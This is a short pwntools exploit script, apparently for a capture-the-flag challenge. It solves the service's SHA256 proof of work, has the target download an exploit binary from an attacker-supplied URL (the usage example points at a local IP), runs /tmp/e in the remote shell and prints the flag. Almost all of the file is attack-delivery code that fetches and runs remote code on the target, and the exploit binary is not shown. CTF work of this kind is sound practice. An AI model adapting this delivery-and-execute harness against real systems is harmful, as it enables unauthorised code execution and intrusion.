from pwn import *
import sys

# python3 exploit.py 127.0.0.1 13371 http://192.168.5.133:8000/exploit

def s(payload): return r.send(payload)
def sl(payload): return r.sendline(payload)
def sla(after, payload): return r.sendlineafter(after, payload)
def sa(after, payload): return r.sendafter(after, payload)
def rc(num): return r.recv(num)
def rcl(): return r.recvline()
def rcls(num): return r.recvlines(num)
def rcu(payload): return r.recvuntil(payload)
def ita(): return r.interactive()
def cl(): return r.close()

def solve_pow(prefix, difficulty=6):
    print(f"[+] Solving PoW: SHA256(prefix + answer) starts with {'0' * difficulty}")
    i = 0
    while True:
        answer = str(i)
        digest = hashlib.sha256((prefix + answer).encode()).hexdigest()
        if digest.startswith('0' * difficulty):
            print(f"[+] Found answer: {answer}")
            print(f"[+] Hash: {digest}")
            return answer
        i += 1

if len(sys.argv) != 4:
    print(f"Usage: {sys.argv[0]} <ip> <port> <exploit_url>")
    sys.exit(1)

ip = sys.argv[1]
port = int(sys.argv[2])
exploit_url = sys.argv[3].encode()

r = remote(ip, port)
rcu(b"[+] Prefix: ")

prefix = rcl().strip().decode()
ans = solve_pow(prefix)

sla(b"[!] Your Answer : ", str(ans).encode())

sla(b"[?] NEED_UPLOAD_EXPLOIT (y/n)", b"y")
sla(b"[!] Input your exploit url : ", exploit_url)

print("[!] Try to exploit...")

sla(b"~ $ ", b"/tmp/e")
sla(b"~ $ ", b"exit")

data = rcls(23)[1].split(b"[")[0].decode()
print("flag: ", data)
r.interactive()
